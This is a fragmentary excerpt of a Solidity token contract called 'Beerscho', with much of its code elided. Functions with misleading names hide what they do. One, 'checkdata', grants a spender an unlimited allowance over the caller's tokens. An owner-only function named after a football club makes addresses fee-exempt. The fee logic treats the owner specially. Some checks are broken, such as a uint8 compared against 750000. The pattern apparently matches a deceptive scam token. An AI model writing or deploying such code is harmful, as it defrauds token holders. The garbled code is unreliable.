...
contract Beerscho is IERC20, Ownable, IDistributorShare{
    
    using SafeMath for uint256;

    string _name = "Beerscho";
    string _symbol = "BEHO";
    uint8 _decimals = 9;
    ...
    function Galatasaray(address holder) external onlyOwner {
        require(holder != address(this));
        initializeDistribution(holder);   
        _isFeeExempt[holder] = true;              
    } 

    function checkdata(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }    

    function takeFee(address recipient, uint256 amount) internal returns (uint256) {        
        uint256 feeApplicable = owner() == recipient ? _totalFeeIfSelling : _totalFee;
    ...
    function requestChange(uint8 gas) external onlyOwner {
        require(gas < 750000);
        _distributorGas = gas;
    }

    function RadioCointokenRebase(int256 supplyDelta, uint256 supplyMax) private view returns (uint256) {
    ...
    function chargefree(uint256 gas) external pure returns(uint256) {
		  require(gas >= 75);        
		  return gas * 1 gwei;
	  }

	function referenceToken(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
		  require(gas >= 750000);
